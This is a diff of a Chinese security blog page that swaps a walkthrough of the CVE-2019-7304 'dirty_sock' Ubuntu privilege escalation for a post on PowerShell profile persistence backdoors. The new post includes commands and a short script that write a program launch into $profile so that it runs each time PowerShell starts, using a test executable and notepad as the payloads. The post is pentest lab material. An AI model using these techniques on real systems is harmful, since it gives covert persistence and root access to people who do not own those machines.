@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
-  <title>CVE-2019-7304 Ubuntu Equity | 九世的博客</title>
-  <meta name="keywords" content=" Writing ">
-  <meta name="description" content="CVE-2019-7304 Ubuntu Equity | 九世的博客">
+  <title>Powershell配置文件-持久性后门 | 九世的博客</title>
+  <meta name="keywords" content=" 权限维持 ">
+  <meta name="description" content="Powershell配置文件-持久性后门 | 九世的博客">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="Become a hacker">
 <meta property="og:type" content="website">
@@ -1137,9 +1137,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-CVE-2019-7304-Ubuntu-Equity" class="article article-type-post" itemscope="" itemprop="blogPost">
+        <article id="post-Powershell配置文件-持久性后门" class="article article-type-post" itemscope="" itemprop="blogPost">
     
-        <h1 class="article-title">CVE-2019-7304 Ubuntu Equity</h1>
+        <h1 class="article-title">Powershell配置文件-持久性后门</h1>
     
     <div class="article-meta">
         
@@ -1148,14 +1148,14 @@
         
         <span class="tag">
             
-            <a href="javascript:" class="color3">Writing</a>
+            <a href="javascript:" class="color5">权限维持</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title="更新时间: 2019-04-19 20:36:16">2019-02-14 11:56</time>
+        创建时间:<time class="date" title="更新时间: 2019-11-07 16:47:33">2019-11-07 16:12</time>
         
     </div>
     <div class="article-meta">
@@ -1177,7 +1177,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2019-7304复现"><span class="toc-text">CVE-2019-7304复现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#正文"><span class="toc-text">正文</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#实验过程"><span class="toc-text">实验过程</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考链接"><span class="toc-text">参考链接</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -1192,41 +1192,36 @@
 </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="CVE-2019-7304复现"><a href="#CVE-2019-7304复现" class="headerlink" title="CVE-2019-7304复现"></a>CVE-2019-7304复现</h2><hr>
-<ul>
-<li>前言</li>
-<li>正文</li>
-</ul>
-<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><hr>
-<p>今天tm的情人节，我还在复现漏洞真是太爽了<br><img src="http://p3.pstatp.com/large/pgc-image/15319211658406048fb51ad" alt="15319211658406048fb51ad"></p>
-<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><hr>
-<p>本次提权漏洞有以下Ubuntu版本受到影响：</p>
-<pre><code>Ubuntu 18.10
-
-Ubuntu 18.04 LTS
-
-Ubuntu 16.04 LTS
-
-Ubuntu 14.04 LTS
-</code></pre><p>提权漏洞的起因是：<br>由于 snapd API 中的错误，Ubuntu Linux 部分版本被发现有本地权限提升漏洞</p>
-<p><b>复现</b><br>我的环境是：</p>
-<pre><code>Ubuntu version:16.04 LTS
-snapd API version:2.34.2
-</code></pre><p><img src="https://s2.ax1x.com/2019/02/14/kB12w9.png" alt="kB12w9.png"></p>
-<p>下载POC：<a href="https://github.com/initstring/dirty_sock" target="_blank" rel="noopener">GitHub - initstring/dirty_sock: Ubuntu Linux privilege escalation exploit (CVE-2019-7304)</a><br><img src="https://s2.ax1x.com/2019/02/14/kB1oQO.md.png" alt="kB1oQO.md.png"></p>
-<p>第一个POC<br>先登录Ubuntu，<a href="https://login.ubuntu.com/" target="_blank" rel="noopener">https://login.ubuntu.com/</a><br>在本地生成秘钥：</p>
-<pre><code>ssh-keygen -t rsa -C &quot;&lt;you email&gt;&quot;
-</code></pre><p>然后到./.ssh下把，id_rsa.pub（公钥）拷到你账户的ssh_key里面去<br><img src="https://s2.ax1x.com/2019/02/14/kB14W6.png" alt="kB14W6.png"></p>
-<p>本地执行第一个poc<br><img src="https://s2.ax1x.com/2019/02/14/kB17Oe.md.png" alt="kB17Oe.md.png"></p>
-<p><img src="https://s2.ax1x.com/2019/02/14/kB1qwd.png" alt="kB1qwd.png"></p>
-<p>如果出现,以下问题就是你没有安装ssh服务<br><img src="https://s2.ax1x.com/2019/02/14/kB1vfP.md.png" alt="kB1vfP.md.png"></p>
-<p>执行：apt-get install openssh-server 即可解决问题，然后再执行一次POC就ok</p>
-<p>执行完POC后，sudo -i即可获取root权限<br><img src="https://s2.ax1x.com/2019/02/14/kB3790.png" alt="kB3790.png"></p>
-<p>第二个POC直接执行即可<br><img src="https://s2.ax1x.com/2019/02/14/kB3qjU.png" alt="kB3qjU.png"></p>
-<p>然后他会创建dirty_sock用户，密码也是dirty_sock，su dirty_sock输入密码，然后在sudo -i ,输入dirty_sock的密码，切换到root用户即可</p>
-<p><img src="https://s2.ax1x.com/2019/02/14/kB8S41.png" alt="kB8S41.png"></p>
-<p><img src="https://s2.ax1x.com/2019/02/14/kB899x.png" alt="kB899x.png"></p>
-<p>转载请声明：转自422926799.github.io</p>
+        <p>powershell配置文件后门，通过设置配置文件后门可以实现每次powershell启动时。执行指定的恶意操作<br><img src="https://s2.ax1x.com/2019/11/07/MkN7Yq.png" alt="MkN7Yq.png"></p>
+<h1 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h1><pre><code class="powershell">echo $profile #输出配置文件的路径
+Test-Path $profile #判断配置文件是否存在，如果返回为False代表不存在，返回True则存在
+New-Item -Path $profile -Type File –Force #新建一个配置文件
+$string = &#39;Start-Process &quot;C:\tmp\pentestlab.exe&quot;&#39; #要启动的恶意程序
+$string | Out-File -FilePath &quot;C:\Users\&lt;User&gt;\Documents\WindowsPowerShell\Microsoft.PowerShe
+ll_profile.ps1&quot; -Append  #写入配置文件
+</code></pre>
+<p><img src="https://s2.ax1x.com/2019/11/07/MkUl1f.png" alt=""></p>
+<p><img src="https://s2.ax1x.com/2019/11/07/MkUahq.png" alt="MkUahq.png"></p>
+<p>测试结果<br><img src="https://s2.ax1x.com/2019/11/07/MkU03V.gif" alt="MkU03V.gif"></p>
+<p>自动写入的ps1脚本</p>
+<pre><code class="powershell">Write-Host -NoNewline [*] New powershell config;
+New-Item -Path $profile -Type File –Force;
+$path=$profile;
+Write-Host [*] config path: $path;
+$sets=Test-Path $profile;
+if($sets -eq &quot;True&quot;){
+    Write-Host [*] New config ok;
+    $payload=&#39;Start-Process &quot;C:\Windows\System32\notepad.exe&quot;&#39;
+    $payload | Out-File -FilePath $path;
+    Write-Host [+] write powershell config ok !!!
+}else{
+    Write-Host -NoNewline [-] New config False...;
+    exit(1);
+}
+</code></pre>
+<p><img src="https://s2.ax1x.com/2019/11/07/MkrEG9.gif" alt=""></p>
+<p>当然你也可以用这个方法来实现无文件攻击</p>
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://pentestlab.blog/2019/11/05/persistence-powershell-profile/" target="_blank" rel="noopener">Persistence – PowerShell Profile | Penetration Testing Lab</a></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
@@ -1236,12 +1231,12 @@ snapd API version:2.34.2
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>CVE-2019-7304 Ubuntu Equity</p>
+    <p><span class="copy-title">文章标题:</span>Powershell配置文件-持久性后门</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="九世">九世</a></p>
-    <p><span class="copy-title">发布时间:</span>2019-02-14, 11:56:19</p>
-    <p><span class="copy-title">最后更新:</span>2019-04-19, 20:36:16</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/92d560e0.html" title="CVE-2019-7304 Ubuntu Equity">http://422926799.github.io/posts/92d560e0.html</a>
+    <p><span class="copy-title">发布时间:</span>2019-11-07, 16:12:33</p>
+    <p><span class="copy-title">最后更新:</span>2019-11-07, 16:47:33</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/3327c145.html" title="Powershell配置文件-持久性后门">http://422926799.github.io/posts/3327c145.html</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
